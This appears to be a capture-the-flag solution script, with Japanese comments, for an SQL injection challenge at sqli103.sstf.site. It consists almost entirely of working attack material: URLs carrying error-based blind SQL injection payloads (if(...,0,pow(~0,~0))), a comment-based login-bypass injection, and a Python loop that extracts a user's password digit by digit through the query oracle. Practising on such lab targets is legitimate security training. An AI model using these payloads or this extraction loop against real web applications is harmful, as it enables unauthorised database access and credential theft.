# https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212515&authkey=!AMsogqhElCqovZY&em=2

"""
条件式の結果をエラーが出るか否かで取得できる脆弱性あり

http://sqli103.sstf.site/survey.php?answer=if(false,0,pow(~0,~0))
"""

"""
admin のパスワード長が9であることが判明

http://sqli103.sstf.site/survey.php?answer=if((select%20length(pw)%20from%20member%20where%20user_id=%27admin%27)=9,0,pow(~0,~0))
"""

"""
admin は admin でないことが判明
http://sqli103.sstf.site/check_id.php?id=admin%27%20and%20is_admin=1%20--%20-
"""

import requests
import time


def check(statement):
    url = f"http://sqli103.sstf.site/survey.php?answer=if({statement},0,pow(~0,~0))"
    res = requests.get(url)
    return res.text == "ok"


print(check("0 = 0"))  # True
print(check("0 = 1"))
print(check("(SELECT length(pw) FROM member WHERE user_id='epsilon') = 6"))
print(check("(SELECT length(pw) FROM member WHERE user_id='epsilon') = 7"))  # True
print(check("(SELECT length(pw) FROM member WHERE user_id='epsilon') = 8"))
print(check("(SELECT length(pw) FROM member WHERE user_id='epsilon') = 9"))
print(check("(SELECT length(pw) FROM member WHERE user_id='epsilon') = 10"))
print(check("(SELECT length(pw) FROM member WHERE user_id='epsilon') = 11"))


password = ""
while len(password) < 7:
    for d in range(10):
        guess = password + str(d)
        sql = f"(SELECT substr(pw,1,{len(guess)}) FROM member WHERE user_id='epsilon') = {guess}"
        if check(sql):
            password = guess
            print(password)
            break
        time.sleep(0.1)
